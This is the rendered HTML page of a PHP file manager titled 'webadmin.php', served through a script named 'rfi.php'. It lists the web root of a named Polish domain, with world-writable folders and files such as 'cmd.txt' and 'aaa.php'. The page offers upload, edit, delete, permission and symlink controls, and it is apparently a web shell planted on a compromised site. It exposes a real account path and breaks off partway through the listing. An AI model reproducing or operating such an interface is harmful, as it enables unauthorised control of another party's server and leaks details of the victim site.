
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>

        <meta http-equiv="Content-Type" content="text/html; charset=" />

        <title>webadmin.php</title>

        <style type="text/css">
            body { font: small sans-serif; text-align: center }
            img { width: 17px; height: 13px }
            a, a:visited { text-decoration: none; color: navy }
            hr { border-style: none; height: 1px; background-color: silver; color: silver }
            #main { margin-top: 6pt; margin-left: auto; margin-right: auto; border-spacing: 1px }
            #main th { background: #eee; padding: 3pt 3pt 0pt 3pt }
            .listing th, .listing td { padding: 1px 3pt 0 3pt }
            .listing th { border: 1px solid silver }
            .listing td { border: 1px solid #ddd; background: white }
            .listing .checkbox { text-align: center }
            .listing .filename { text-align: left }
            .listing .size { text-align: right }
            .listing th.permission { text-align: left }
            .listing td.permission { font-family: monospace }
            .listing .owner { text-align: left }
            .listing .group { text-align: left }
            .listing .functions { text-align: left }
            .listing_footer td { background: #eee; border: 1px solid silver }
            #directory, #upload, #create, .listing_footer td, #error td, #notice td { text-align: left; padding: 3pt }
            #directory { background: #eee; border: 1px solid silver }
            #upload { padding-top: 1em }
            #create { padding-bottom: 1em }
            .small, .small option { font-size: x-small }
            textarea { border: none; background: white }
            table.dialog { margin-left: auto; margin-right: auto }
            td.dialog { background: #eee; padding: 1ex; border: 1px solid silver; text-align: center }
            #permission { margin-left: auto; margin-right: auto }
            #permission td { padding-left: 3pt; padding-right: 3pt; text-align: center }
            td.permission_action { text-align: right }
            #symlink { background: #eee; border: 1px solid silver }
            #symlink td { text-align: left; padding: 3pt }
            #red_button { width: 120px; color: #400 }
            #green_button { width: 120px; color: #040 }
            #error td { background: maroon; color: white; border: 1px solid silver }
            #notice td { background: green; color: white; border: 1px solid silver }
            #notice pre, #error pre { background: silver; color: black; padding: 1ex; margin-left: 1ex; margin-right: 1ex }
            code { font-size: 12pt }
            td { white-space: nowrap }
        </style>

        <script type="text/javascript">
            <!--
                function activate (name) {
                if (document && document.forms[0] && document.forms[0].elements['focus']) {
                    document.forms[0].elements['focus'].value = name;
                }
            }
            //-->
        </script>

    </head>
    <body>

        <h1 style="margin-bottom: 0">webadmin.php</h1>

        <form enctype="multipart/form-data" action="rfi.php" method="post">

            <table id="main">
                <tr>
                    <td colspan="7" id="directory">
                        <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">Directory</a>:
                        <input type="text" name="dir" size="64" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/" onfocus="activate('directory')" />
                        <input type="submit" name="changedir" value="change" onfocus="activate('directory')" />
                    </td>
                </tr>
                <tr>
                    <td colspan="7" id="upload">
                        File:
                        <input type="file" name="upload" onfocus="activate('other')" />
                        <input type="submit" name="submit_upload" value="upload" onfocus="activate('other')" />
                    </td>
                </tr>
                <tr>
                    <td colspan="7" id="create">
                        <select name="create_type" size="1" onfocus="activate('create')">
                            <option value="file">File</option>
                            <option value="directory">Directory</option>
                        </select>
                        <input type="text" name="create_name" onfocus="activate('create')" />
                        <input type="submit" name="submit_create" value="create" onfocus="activate('create')" />
                    </td>
                </tr>
                <tr class="listing">
                    <th style="text-align: center; vertical-align: middle"><img src="rfi.php?image=smiley" alt="smiley" /></th>
                    <th class="filename"><a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F&amp;sort=filename&amp;reverse=true">Filename</a> &and;</th>
                    <th class="size"><a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F&amp;sort=size">Size</a></th>
                    <th class="permission"><a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F&amp;sort=permission">Permission</a></th>
                    <th class="owner"><a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F&amp;sort=owner">Owner</a></th>
                    <th class="group"><a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F&amp;sort=group">Group</a></th>
                    <th class="functions">Functions</th>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked0" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 8/2/19 20:12:33, atime: 3/20/19 17:32:46, ctime: 8/2/19 20:12:33"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F.">.</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F.&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file0" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/." />
                        <select class="small" name="action0" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit0" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked1" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 3/21/19 01:54:24, atime: 3/20/19 17:32:46, ctime: 3/21/19 01:54:24"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F..">..</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40711"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F..&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwx--x--x</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file1" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/.." />
                        <select class="small" name="action1" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit1" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked2" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 3/20/19 17:32:46, atime: 3/20/19 17:32:46, ctime: 8/2/19 14:38:56"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F.svn">.svn</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F.svn&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file2" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/.svn" />
                        <select class="small" name="action2" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit2" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked3" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 7/31/19 20:02:40, atime: 7/22/19 18:02:32, ctime: 8/2/19 14:38:56"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fblog_php">blog_php</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fblog_php&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file3" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/blog_php" />
                        <select class="small" name="action3" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit3" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked4" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 3/20/19 17:32:46, atime: 3/20/19 17:32:46, ctime: 8/2/19 14:38:56"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fcgi-bin">cgi-bin</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fcgi-bin&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file4" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/cgi-bin" />
                        <select class="small" name="action4" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit4" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked5" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 7/31/19 15:45:04, atime: 3/20/19 18:59:08, ctime: 8/2/19 14:38:56"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz1">z1</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz1&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file5" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/z1" />
                        <select class="small" name="action5" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit5" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked6" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 8/2/19 15:05:01, atime: 3/20/19 18:59:08, ctime: 8/2/19 15:05:01"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz2">z2</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz2&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file6" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/z2" />
                        <select class="small" name="action6" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit6" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked7" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 3/20/19 18:59:00, atime: 3/20/19 18:58:50, ctime: 8/2/19 14:38:57"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz3">z3</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz3&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file7" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/z3" />
                        <select class="small" name="action7" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit7" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked8" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 3/20/19 18:59:04, atime: 3/20/19 18:59:01, ctime: 8/2/19 14:38:57"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz5">z5</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz5&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file8" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/z5" />
                        <select class="small" name="action8" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit8" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked9" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 3/22/19 17:08:34, atime: 3/22/19 16:56:07, ctime: 8/2/19 14:38:56"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz8">z8</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz8&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file9" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/z8" />
                        <select class="small" name="action9" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit9" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked10" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 3/22/19 17:21:25, atime: 3/22/19 17:18:54, ctime: 8/2/19 14:38:56"><img src="rfi.php?image=folder" alt="folder" /> [ <a href="rfi.php?dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz9">z9</a> ]</td>
                    <td class="size" title="4 kB">4096 B</td>
                    <td class="permission" title="40777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fz9&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">drwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file10" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/z9" />
                        <select class="small" name="action10" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                        </select>
                        <input class="small" type="submit" name="submit10" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked11" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 8/2/19 11:32:59, atime: 8/2/19 11:32:59, ctime: 8/2/19 17:55:59"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Faaa.php">aaa.php</a></td>
                    <td class="size">36 B</td>
                    <td class="permission" title="100777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Faaa.php&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file11" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/aaa.php" />
                        <select class="small" name="action11" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit11" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked12" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 8/2/19 15:38:02, atime: 8/2/19 15:38:02, ctime: 8/2/19 15:38:41"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fcmd.txt">cmd.txt</a></td>
                    <td class="size">36 B</td>
                    <td class="permission" title="100644"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fcmd.txt&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rw-r--r--</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file12" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/cmd.txt" />
                        <select class="small" name="action12" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit12" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked13" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 3/20/19 18:58:36, atime: 3/20/19 18:58:35, ctime: 8/2/19 14:38:56"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fdownload.php">download.php</a></td>
                    <td class="size">522 B</td>
                    <td class="permission" title="100777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fdownload.php&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file13" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/download.php" />
                        <select class="small" name="action13" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit13" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked14" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 7/22/19 18:01:47, atime: 7/22/19 18:01:47, ctime: 8/2/19 14:38:56"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fhtdocs+-+Shortcut.lnk">htdocs - Shortcut.lnk</a></td>
                    <td class="size">835 B</td>
                    <td class="permission" title="100777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fhtdocs+-+Shortcut.lnk&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file14" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/htdocs - Shortcut.lnk" />
                        <select class="small" name="action14" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
